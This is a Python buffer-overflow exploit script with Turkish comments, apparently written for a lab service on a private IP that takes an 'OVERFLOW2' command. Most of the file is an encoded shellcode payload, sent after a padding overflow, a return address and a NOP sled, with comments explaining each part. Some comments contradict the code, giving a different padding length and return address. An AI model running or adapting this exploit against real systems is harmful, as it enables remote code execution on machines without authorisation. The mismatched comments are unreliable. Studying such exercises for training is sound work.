#!/usr/bin/env python3
# Python 3 ile çalıştırılması gerektiğini belirtir.

import sys, time, socket
# 'sys', 'time' ve 'socket' modülleri import ediliyor.
# - 'sys': Sistem işlemleri için kullanılır (örneğin, betiği sonlandırmak).
# - 'time': Bekleme süreleri için kullanılır.
# - 'socket': Ağ bağlantıları ve veri iletişimi için kullanılır.

ip = "192.168.1.44"  # Hedef makinenin IP adresi. Bu IP'yi kendi test ortamınıza göre değiştirmelisiniz.
port = 1337  # Hedef port. Bu, hedef uygulamanın dinlediği portu temsil ediyor. Portu da değiştirebilirsiniz.
timeout = 5  # Bağlantının zaman aşımı süresi. 5 saniye boyunca yanıt gelmezse bağlantı sonlanacak.

buf = ""  # Bu değişken, kabuk kodunu (shellcode) içeriyor. Zararlı kodlar veya belirli bir komutun çalıştırılması için kullanılır.
# Aşağıdaki satırlar, exploit sırasında kullanılacak olan shellcode'u (kabuk kodunu) hex formatında içerir.
buf =  ""
buf += "\xeb\x27\x5b\x53\x5f\xb0\xa5\xfc\xae\x75\xfd\x57"
buf += "\x59\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff"
buf += "\xc6\x66\x81\x3f\xe2\xf7\x74\x07\x80\x3e\xa5\x75"
buf += "\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x10\x2a"
buf += "\xa5\xec\x62\x93\xce\xe0\xc2\xd0\x2a\x10\x2a\x51"
buf += "\x7b\x51\x7a\x42\x7b\x46\x62\x21\xf8\x75\x62\x9b"
buf += "\x78\x70\x62\x9b\x78\x08\x62\x9b\x78\x30\x62\x9b"
buf += "\x58\x40\x62\x1f\x9d\x5a\x60\x5d\x1b\xd9\x62\x21"
buf += "\xea\xbc\x16\x71\x56\x12\x06\x30\x6b\xd1\xe3\x1d"
buf += "\x6b\x11\xeb\xf2\xc7\x42\x6b\x41\x62\x9b\x78\x30"
buf += "\xa1\x52\x16\x58\x2b\xc0\xa1\x90\xa2\x10\x2a\x10"
buf += "\x62\x95\xea\x64\x4d\x58\x2b\xc0\x7a\x9b\x62\x08"
buf += "\x6e\x9b\x6a\x30\x63\x11\xfa\xf3\x7c\x58\xd5\xd9"
buf += "\x6b\x9b\x1e\x98\x62\x11\xfc\x5d\x1b\xd9\x62\x21"
buf += "\xea\xbc\x6b\xd1\xe3\x1d\x6b\x11\xeb\x28\xca\x65"
buf += "\xdb\x5c\x29\x5c\x0e\x18\x6f\x29\xfb\x65\xf2\x48"
buf += "\x6e\x9b\x6a\x34\x63\x11\xfa\x76\x6b\x9b\x26\x58"
buf += "\x6e\x9b\x6a\x0c\x63\x11\xfa\x51\xa1\x14\xa2\x58"
buf += "\x2b\xc0\x6b\x48\x6b\x48\x74\x49\x70\x51\x72\x51"
buf += "\x73\x51\x70\x58\xa9\xfc\x0a\x51\x78\xef\xca\x48"
buf += "\x6b\x49\x70\x58\xa1\x02\xc3\x47\xd5\xef\xd5\x4d"
buf += "\x63\xae\x5d\x63\x18\x4f\x19\x22\x2a\x10\x6b\x46"
buf += "\x63\x99\xcc\x58\xab\xfc\x8a\x11\x2a\x10\x63\x99"
buf += "\xcf\x59\x96\x12\x2a\x01\x76\xd0\x82\x35\xa1\x51"
buf += "\x7e\x59\xa3\xf4\x66\x99\xdb\x51\x90\x5c\x5d\x36"
buf += "\x2d\xef\xff\x5c\xa3\xfa\x42\x11\x2b\x10\x2a\x49"
buf += "\x6b\xaa\x03\x90\x41\x10\xd5\xc5\x7a\x40\x67\x21"
buf += "\xe3\x5d\x1b\xd0\x62\xef\xea\x58\xa3\xd2\x62\xef"
buf += "\xea\x58\xa3\xd1\x6b\xaa\xc0\x1f\xf5\xf0\xd5\xc5"
buf += "\x62\x99\xed\x7a\x3a\x51\x72\x5c\xa3\xf2\x62\x99"
buf += "\xd3\x51\x90\x89\x8f\x64\x4b\xef\xff\x58\xab\xd4"
buf += "\x6a\x12\x2a\x10\x63\xa8\x49\x7d\x4e\x10\x2a\x10"
buf += "\x2a\x10\x6b\x40\x6b\x40\x62\x99\xc8\x47\x7d\x47"
buf += "\x67\x21\xea\x7a\x27\x49\x6b\x40\xc8\xec\x4c\xd7"
buf += "\x6e\x34\x7e\x11\x2b\x58\xa7\x54\x0e\x08\xec\x10"
buf += "\x42\x58\xa3\xf6\x7c\x40\x6b\x40\x6b\x40\x6b\x40"
buf += "\x63\xef\xea\x51\x7a\x59\xd5\xd8\x67\x99\xeb\x5c"
buf += "\xa3\xd1\x6b\xaa\x53\xdc\x15\x96\xd5\xc5\x62\x21"
buf += "\xf8\x58\xd5\xda\xa1\x1e\x6b\xaa\x22\x97\x37\x70"
buf += "\xd5\xc5\x91\xf0\x37\x3a\x20\x51\x90\xb6\xbf\xad"
buf += "\xb7\xef\xff\x58\xa9\xd4\x02\x2c\x2c\x6c\x20\x90"
buf += "\xd1\xf0\x5f\x15\x91\x57\x39\x62\x45\x7a\x2a\x49"
buf += "\x6b\x99\xf0\xef\xff\xe2\xf7"
# Bu kodların tamamı hedefe gönderilecek shellcode'u (zararlı kodu) içeriyor. Bu, muhtemelen bir sisteme sızmak veya belirli bir komutu çalıştırmak için kullanılır.

prefix = "OVERFLOW2 "  # Komutun başına eklenecek bir ön ek. Bu, hedef uygulamaya uygun bir komut ya da formatı olabilir.
string = prefix + "A"*634 + "\xAF\x11\x50\x62" + "\x90"*16 + buf  # Gönderilecek veriyi tanımlar. 625011AF
# - 1274 baytlık 'A' karakteri buffer overflow oluşturmak için.
# - "\x03\x12\x50\x62": Bu, **return address** (geri dönüş adresi) olarak kullanılır. Kodun nereye atlayacağını belirtir.
# - "\x90"*16: Bu, **NOP sled** olarak bilinir. Kodun atlama noktasından shellcode'a güvenli bir şekilde ulaşmasını sağlar. 
# - 'buf': Hedef sistemde çalıştırılacak shellcode.

try:
    # Hata oluşmazsa çalıştırılacak kodlar burada yer alıyor.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # TCP bağlantısı açılıyor.
        s.settimeout(timeout)
        # Bağlantı için zaman aşımı 5 saniye olarak ayarlandı.
        s.connect((ip, port))
        # IP ve port'a bağlanılıyor.
        s.send(bytes(string, "latin-1"))
        # Veri gönderiliyor. Gönderilecek veri 'latin-1' formatında kodlanıyor.
except:
    # Eğer bağlantı kurulamazsa ya da hata olursa, bu blok çalışıyor.
    print("Bağlanılamadı")
    # Hata mesajı olarak "Could not connect" yazdırılıyor.
